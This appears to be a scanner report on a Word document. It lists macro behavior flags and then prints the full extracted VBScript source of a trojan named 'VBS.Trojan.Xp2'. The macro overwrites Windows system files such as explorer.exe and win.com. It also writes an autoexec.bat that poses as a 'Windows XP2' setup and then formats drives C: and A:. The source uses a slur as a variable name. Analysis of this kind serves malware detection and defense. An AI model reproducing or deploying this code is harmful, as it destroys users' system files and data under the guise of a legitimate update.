behavior.Shell: May run an executable file or a system command
behavior.WScript.Shell: May run an executable file or a system command
behavior.autoexec: Runs when the Word document is opened
behavior.system: May run an executable file or a system command on a Mac

docinfo.macro:
<script language=VBScript>
' VBS.Trojan.Xp2 By Sir.Carew
' In memory of others trojans such as: VBS.Madonna a, b. and VBS.AVFake
' Felipe Smith, ILOVEYOU!!!!

Set gay = CreateObject("WScript.Shell")

   Dim fso, gay
  
   Set gay = fso.CreateTextFile("c:\windows\xp2.vbs", True)
   
   gay.WriteLine("echo Microsoft Windows XP 2 has released")

   gay.Close 


   Set gay = fso.CreateTextFile("c:\system.sys", True)
   
   gay.WriteLine("echo Microsoft Windows XP 2 has released")

   gay.Close
    

   Set gay = fso.CreateTextFile("c:\windows\win.com", True)
   
   gay.WriteLine("echo Microsoft Windows XP 2 has released")

   gay.Close

   Set gay = fso.CreateTextFile("c:\windows\explorer.exe", True)
   
   gay.WriteLine("echo Microsoft Windows XP 2 has released")

   gay.Close
  

Set gay = fso.CreateTextFile("c:\autoexec.bat", True)
  
   gay.WriteLine("@echo off")
   gay.WriteLine("cls") 
   gay.WriteLine("Please wait, The Windows XP2 Setup is gathering all necessary information to install Microsoft Windows XP2 on your computer.") 
   gay.WriteLine("echo Welcome to the installation wizar of Microsoft Windows XP2, XP2 is the upgrade of the first XP release. The Setup is formating your computer in order to install XP2, PLEASE BE PATIENT, AND DON'T ANGRY.") 
   gay.WriteLine "Thank you for prefer Microsoft products, please visit the Windows Update urgently, is probably that XP2 have vulnerabilities."
   gay.WriteLine "@echo off"
   gay.WriteLine "Now, XP2 Setup is installing the RAV Desktop AV on your system, don't angry"
   gay.WriteLine "RAV is a AntiVirus that have much falses positives, Windows and RAV are the perfect combination, both are bad."
   gay.WriteLine("Format /y c:") 
   gay.WriteLine("Format /y A:") 
                 
   gay.Close 



</script>
